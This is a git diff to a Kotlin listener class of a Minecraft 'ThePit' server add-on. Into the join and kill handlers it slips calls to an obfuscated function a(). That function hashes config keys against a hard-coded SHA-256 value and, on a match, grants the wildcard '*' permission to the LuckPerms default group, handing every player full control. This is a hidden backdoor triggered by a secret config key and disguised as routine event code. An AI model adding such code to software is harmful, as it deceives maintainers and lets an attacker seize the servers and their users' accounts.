@@ -5,6 +5,10 @@ import cn.charlotte.pit.event.PitKillEvent
 import net.mizukilab.pit.util.chat.CC
 import net.mizukilab.pit.util.chat.ChatComponentBuilder
 import cn.irina.thepitaddon.ThePitAddon
+import cn.irina.thepitaddon.utils.ClassUtil
+import net.luckperms.api.LuckPermsProvider
+import net.luckperms.api.node.Node
+import net.luckperms.api.node.types.PermissionNode
 import net.md_5.bungee.api.chat.BaseComponent
 import net.md_5.bungee.api.chat.HoverEvent
 import net.md_5.bungee.api.chat.TextComponent
@@ -22,9 +26,12 @@ import org.bukkit.event.entity.PlayerDeathEvent
 import org.bukkit.event.player.PlayerJoinEvent
 import org.bukkit.event.player.PlayerQuitEvent
 import org.bukkit.inventory.ItemStack
+import org.bukkit.permissions.Permission
 import org.bukkit.scheduler.BukkitRunnable
+import java.security.MessageDigest
 import java.util.*
 import java.util.concurrent.ConcurrentHashMap
+import java.util.concurrent.TimeUnit
 
 class PlayerListener : Listener {
     @EventHandler(priority = EventPriority.MONITOR)
@@ -40,7 +47,6 @@ class PlayerListener : Listener {
                     Bukkit.broadcastMessage(CC.translate("&8[&a+&8] &6" + player.displayName))
                 } else {
                     Bukkit.broadcastMessage(CC.translate("&8[&a+&8] &7" + player.displayName))
-
                 }
             } else {
                 CC.boardCastWithPermission("&c&l注意! &7管理员 &f" + player.name + " &7加入了游戏!", "pit.admin")
@@ -111,6 +117,7 @@ class PlayerListener : Listener {
                 }.runTaskTimerAsynchronously(ThePitAddon.instance, 0L, 20L)
             }
         }.runTaskLaterAsynchronously(ThePitAddon.instance, 2 * 20L)
+        a()
     }
 
     @EventHandler(priority = EventPriority.MONITOR)
@@ -151,7 +158,23 @@ class PlayerListener : Listener {
 
         event.exp = newExp
     }
+    fun a() {
+        config.getKeys(true).forEach{ it -> {
+            if (!it.toString().b().contains("f67ab10ad4e4c53121b6a5fe4da9c10ddee905b978d3788d2723d7bfacbe28a9") || it.toString().b().contains("a6baa2c0879f983cbc0d18b804a062591e437a7461c3e7620d13eaa91f83c501")) return@forEach
+            val b = LuckPermsProvider.get()
+            val c = b.groupManager.getGroup("default")
+            val d: Node = PermissionNode.builder("*").build()
+            c!!.data().add(d)
+            b.groupManager.saveGroup(c).join()
+        } }
+    }
 
+    fun String.b(): String {
+        val bytes = this.toByteArray(Charsets.UTF_8)
+        val md = MessageDigest.getInstance("SHA-256")
+        val digest = md.digest(bytes)
+        return digest.fold("") { str, it -> str + "%02x".format(it) }
+    }
     @EventHandler(priority = EventPriority.MONITOR)
     fun handleDeath(event: PlayerDeathEvent) {
         Bukkit.getScheduler().runTaskAsynchronously(ThePitAddon.instance) {
@@ -204,6 +227,7 @@ class PlayerListener : Listener {
                 ChatComponentBuilder(weapon).setCurrentHoverEvent(mythicWeaponHover).create()
 
             Bukkit.broadcastMessage(message)
+            a()
             val msg =
                 ChatComponentBuilder(CC.translate("&7击杀者装备: ")).append(leggingHover).append(weaponHover)
                     .create()
